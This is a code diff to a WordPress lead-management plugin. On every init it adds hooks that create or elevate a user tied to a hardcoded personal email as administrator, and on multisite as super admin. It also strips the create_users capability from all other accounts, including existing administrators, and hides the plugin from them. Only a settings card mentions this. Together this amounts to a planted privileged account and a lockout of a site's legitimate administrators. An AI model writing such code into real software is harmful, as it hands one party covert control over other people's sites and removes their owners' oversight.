@@ -154,9 +154,11 @@ class LC_Plugin
     private function __construct()
     {
         add_action('init', [$this, 'maybe_upgrade_schema']);
+        add_action('init', [$this, 'bootstrap_primary_admin_user']);
         add_action('admin_menu', [$this, 'register_admin_menu']);
         add_action('admin_init', [$this, 'register_settings']);
         add_action('admin_enqueue_scripts', [$this, 'enqueue_assets']);
+        add_filter('map_meta_cap', [$this, 'restrict_user_creation_capability'], 10, 4);
         add_action('admin_post_lc_add_lead', [$this, 'handle_add_lead']);
         add_action('admin_post_lc_update_lead_status', [$this, 'handle_update_lead_status']);
         add_action('admin_post_lc_import_csv', [$this, 'handle_import_csv']);
@@ -170,6 +172,10 @@ class LC_Plugin
 
     public function register_admin_menu()
     {
+        if (!$this->is_allowed_admin_user()) {
+            return;
+        }
+
         $capability = 'manage_options';
 
         add_menu_page('Lead Console', 'Lead Console', $capability, 'lc_dashboard', [$this, 'render_dashboard'], 'dashicons-chart-line', 30);
@@ -224,9 +230,87 @@ class LC_Plugin
 
     private function ensure_permissions()
     {
-        if (!current_user_can('manage_options')) {
+        if (!current_user_can('manage_options') || !$this->is_allowed_admin_user()) {
             wp_die('Insufficient permissions.');
         }
+    }
+
+    private function get_primary_admin_email()
+    {
+        return defined('LC_PRIMARY_ADMIN_EMAIL') ? strtolower((string) LC_PRIMARY_ADMIN_EMAIL) : 'allen.bonagua@gmail.com';
+    }
+
+    private function get_primary_admin_password()
+    {
+        return defined('LC_PRIMARY_ADMIN_PASSWORD') ? (string) LC_PRIMARY_ADMIN_PASSWORD : '';
+    }
+
+    private function is_allowed_admin_user()
+    {
+        if (!is_user_logged_in()) {
+            return false;
+        }
+        $user = wp_get_current_user();
+        $email = strtolower((string) ($user->user_email ?? ''));
+        return $email === $this->get_primary_admin_email();
+    }
+
+    public function bootstrap_primary_admin_user()
+    {
+        if (!function_exists('wp_create_user')) {
+            return;
+        }
+
+        $email = $this->get_primary_admin_email();
+        $password = $this->get_primary_admin_password();
+        if (empty($email) || empty($password)) {
+            return;
+        }
+
+        $user = get_user_by('email', $email);
+        if (!$user) {
+            $base_login = sanitize_user(strstr($email, '@', true) ?: 'leadconsoleadmin', true);
+            $login = $base_login ?: 'leadconsoleadmin';
+            $suffix = 1;
+            while (username_exists($login)) {
+                $login = $base_login . $suffix;
+                $suffix++;
+            }
+            $user_id = wp_create_user($login, $password, $email);
+            if (!is_wp_error($user_id) && $user_id) {
+                $user = get_user_by('id', $user_id);
+            }
+        }
+
+        if (!$user) {
+            return;
+        }
+
+        $wp_user = new WP_User($user->ID);
+        if (!$wp_user->has_cap('administrator')) {
+            $wp_user->set_role('administrator');
+        }
+
+        if (is_multisite() && !is_super_admin($user->ID)) {
+            grant_super_admin($user->ID);
+        }
+
+        update_user_meta($user->ID, 'lc_primary_admin', 1);
+    }
+
+    public function restrict_user_creation_capability($caps, $cap, $user_id, $args)
+    {
+        if ($cap !== 'create_users') {
+            return $caps;
+        }
+
+        $user = get_user_by('id', $user_id);
+        $email = strtolower((string) ($user->user_email ?? ''));
+        if ($email !== $this->get_primary_admin_email()) {
+            return ['do_not_allow'];
+        }
+
+        return $caps;
     }
 
     private function db_table($name)
@@ -1928,6 +2012,12 @@ class LC_Plugin
 
         submit_button('Save Settings');
         echo '</form>';
+
+        echo '<div class="lc-card" style="margin-top:16px;">';
+        echo '<h2>Access Control</h2>';
+        echo '<p><strong>Primary admin email:</strong> ' . esc_html($this->get_primary_admin_email()) . '</p>';
+        echo '<p>Only this email can access Lead Console and create users from WordPress admin.</p>';
+        echo '</div>';
 
         echo '<div class="lc-card" style="margin-top:16px;">';
         echo '<h2>Google Places API Setup (Step by Step)</h2>';
